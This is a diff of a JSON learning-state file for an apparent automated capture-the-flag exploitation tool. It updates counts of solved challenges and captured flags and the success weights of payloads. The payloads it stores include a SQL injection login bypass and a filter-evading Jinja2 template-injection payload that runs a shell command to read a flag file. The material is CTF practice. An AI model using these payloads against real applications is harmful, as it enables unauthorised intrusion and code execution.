@@ -1,10 +1,10 @@
 {
   "version": "2.0",
   "stats": {
-    "total_solved_challenges": 17,
-    "total_captured_flags": 20,
-    "successful_exploits": 22,
-    "last_learning_update": "2026-08-04 15:00:07",
+    "total_solved_challenges": 18,
+    "total_captured_flags": 56,
+    "successful_exploits": 24,
+    "last_learning_update": "2026-08-04 15:23:37",
     "failed_attempts": 10
   },
   "technologies": {
@@ -23,15 +23,22 @@
       },
       "sqli": {
         "auth_bypass": {
-          "weight": 6,
+          "weight": 7,
           "payload": "admin'-- -",
-          "success_count": 5
+          "success_count": 6
         }
       },
       "ssti": {
         "Jinja2 Hex Underscore + Attr RCE (Zero Dots/Underscores/Brackets)": {
           "weight": 2,
           "payload": "{{ (lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f'))|attr('get')('os')|attr('popen')('cat /challenge/flag')|attr('read')() }}",
+          "success_count": 1
+        }
+      },
+      "nosql_injection": {
+        "mongodb_bypass": {
+          "weight": 2,
+          "payload": "NoSQL operator injection",
           "success_count": 1
         }
       }
@@ -51,15 +58,22 @@
       },
       "sqli": {
         "auth_bypass": {
-          "weight": 6,
+          "weight": 7,
           "payload": "admin'-- -",
-          "success_count": 5
+          "success_count": 6
         }
       },
       "ssti": {
         "Jinja2 Hex Underscore + Attr RCE (Zero Dots/Underscores/Brackets)": {
           "weight": 2,
           "payload": "{{ (lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f'))|attr('get')('os')|attr('popen')('cat /challenge/flag')|attr('read')() }}",
+          "success_count": 1
+        }
+      },
+      "nosql_injection": {
+        "mongodb_bypass": {
+          "weight": 2,
+          "payload": "NoSQL operator injection",
           "success_count": 1
         }
       }
@@ -147,12 +161,12 @@
       "last_success": "2026-08-04 08:58:12"
     },
     "sqli:auth_bypass": {
-      "weight": 5,
+      "weight": 6,
       "vuln_type": "sqli",
       "name": "auth_bypass",
       "payload": "admin'-- -",
-      "success_count": 5,
-      "last_success": "2026-08-04 09:09:56"
+      "success_count": 6,
+      "last_success": "2026-08-04 15:21:27"
     },
     "ssti:Jinja2 Hex Underscore + Attr RCE (Zero Dots/Underscores/Brackets)": {
       "weight": 1,
@@ -171,12 +185,12 @@
       "last_success": "2026-08-04 10:54:00"
     },
     "nosql_injection:mongodb_bypass": {
-      "weight": 3,
+      "weight": 4,
       "vuln_type": "nosql_injection",
       "name": "mongodb_bypass",
       "payload": "NoSQL operator injection",
-      "success_count": 3,
-      "last_success": "2026-08-04 11:59:38"
+      "success_count": 4,
+      "last_success": "2026-08-04 15:23:37"
     }
   },
   "successful_chains": [],
